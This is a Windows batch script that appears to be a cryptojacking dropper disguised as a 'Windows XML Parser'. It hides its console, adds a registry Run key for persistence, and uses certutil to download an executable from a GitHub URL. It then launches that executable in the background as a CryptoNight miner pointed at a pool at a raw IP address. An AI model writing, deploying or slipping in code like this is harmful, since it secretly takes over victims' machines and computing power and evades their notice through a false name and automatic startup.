@echo off
SETCONSOLE /minimize
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Windows XML Parser" /t REG_SZ /F /D "C:\ProgramData\Windows XML Parser\parser.cmd"
mkdir "C:\ProgramData\Windows XML Parser\"
set root="C:\ProgramData\Windows XML Parser\"
cd %root%

if not exist "winxmlp.exe" (
	goto :DOWNLOAD
)else goto :OK

:DOWNLOAD 
certutil.exe -urlcache -split -f  "https://github.com/dansiebels1337/Windows-XML-Parser/raw/master/winxmlp.exe" 
:OK
winxmlp.exe -a "cn/r" --donate-level 0 --cpu-affinity 0 --cpu-priority 1 --threads=1 -o 172.105.6.74:8080 -k --nicehash --background
pause
